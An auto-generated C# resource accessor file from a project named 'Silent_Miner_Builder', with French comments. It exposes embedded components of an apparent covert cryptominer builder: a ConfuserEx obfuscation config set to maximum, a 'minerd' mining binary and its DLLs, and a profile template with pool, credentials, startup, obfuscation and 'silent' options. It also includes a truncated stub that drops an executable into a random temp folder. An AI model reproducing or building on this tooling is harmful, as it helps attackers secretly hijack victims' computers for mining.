﻿//------------------------------------------------------------------------------
// <auto-generated>
//     Ce code a été généré par un outil.
//     Version du runtime :4.0.30319.42000
//
//     Les modifications apportées à ce fichier peuvent provoquer un comportement incorrect et seront perdues si
//     le code est régénéré.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Silent_Miner_Builder.Properties {
    using System;
    
    
    /// <summary>
    ///   Une classe de ressource fortement typée destinée, entre autres, à la consultation des chaînes localisées.
    /// </summary>
    // Cette classe a été générée automatiquement par la classe StronglyTypedResourceBuilder
    // à l'aide d'un outil, tel que ResGen ou Visual Studio.
    // Pour ajouter ou supprimer un membre, modifiez votre fichier .ResX, puis réexécutez ResGen
    // avec l'option /str ou régénérez votre projet VS.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "15.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Retourne l'instance ResourceManager mise en cache utilisée par cette classe.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Silent_Miner_Builder.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Remplace la propriété CurrentUICulture du thread actuel pour toutes
        ///   les recherches de ressources à l'aide de cette classe de ressource fortement typée.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à &lt;project outputDir=&quot;%path%&quot; baseDir=&quot;%path%&quot; xmlns=&quot;http://confuser.codeplex.com&quot;&gt;
        ///  &lt;rule pattern=&quot;true&quot; preset=&quot;maximum&quot; /&gt;
        ///  &lt;module path=&quot;%stub%&quot;&gt;
        ///    &lt;rule pattern=&quot;true&quot; preset=&quot;maximum&quot; /&gt;
        ///  &lt;/module&gt;
        ///&lt;/project&gt;.
        /// </summary>
        internal static string config {
            get {
                return ResourceManager.GetString("config", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Byte[].
        /// </summary>
        internal static byte[] ConfuserEx {
            get {
                object obj = ResourceManager.GetObject("ConfuserEx", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Byte[].
        /// </summary>
        internal static byte[] libcurl_4 {
            get {
                object obj = ResourceManager.GetObject("libcurl_4", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Byte[].
        /// </summary>
        internal static byte[] libiconv_2 {
            get {
                object obj = ResourceManager.GetObject("libiconv_2", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Byte[].
        /// </summary>
        internal static byte[] libidn_11 {
            get {
                object obj = ResourceManager.GetObject("libidn_11", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Byte[].
        /// </summary>
        internal static byte[] libintl_8 {
            get {
                object obj = ResourceManager.GetObject("libintl_8", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Byte[].
        /// </summary>
        internal static byte[] libwinpthread_1 {
            get {
                object obj = ResourceManager.GetObject("libwinpthread_1", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Byte[].
        /// </summary>
        internal static byte[] minerd {
            get {
                object obj = ResourceManager.GetObject("minerd", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à %pool%
        ///%user%
        ///%password%
        ///%startup%
        ///%threads%
        ///%algo%
        ///%obf%
        ///%silent%
        ///%host%.
        /// </summary>
        internal static string Profile {
            get {
                return ResourceManager.GetString("Profile", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à using System.IO;
        ///using Microsoft.VisualBasic;
        ///using System.Reflection;
        ///using System.Threading;
        ///
        ///namespace System
        ///{
        ///    class Program
        ///    {
        ///        static string _InstallFolder = Path.GetTempPath() + &quot;%random%\\&quot;;
        ///        static string _ExePath = _InstallFolder + &quot;%random1%.exe&quot;;
        ///        static string libcurl = _InstallFolder + &quot;libcurl-4.dll&quot;;
        ///        static string libiconv = _InstallFolder + &quot;libiconv-2.dll&quot;;
        ///        static string libidn = _InstallFolder + &quot;libidn-11.dll&quot;;
        ///        static stri [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string stub {
            get {
                return ResourceManager.GetString("stub", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Drawing.Bitmap.
        /// </summary>
        internal static System.Drawing.Bitmap xCryptocurrency_logo_1845x580 {
            get {
                object obj = ResourceManager.GetObject("xCryptocurrency_logo_1845x580", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Byte[].
        /// </summary>
        internal static byte[] zlib1 {
            get {
                object obj = ResourceManager.GetObject("zlib1", resourceCulture);
                return ((byte[])(obj));
            }
        }
    }
}
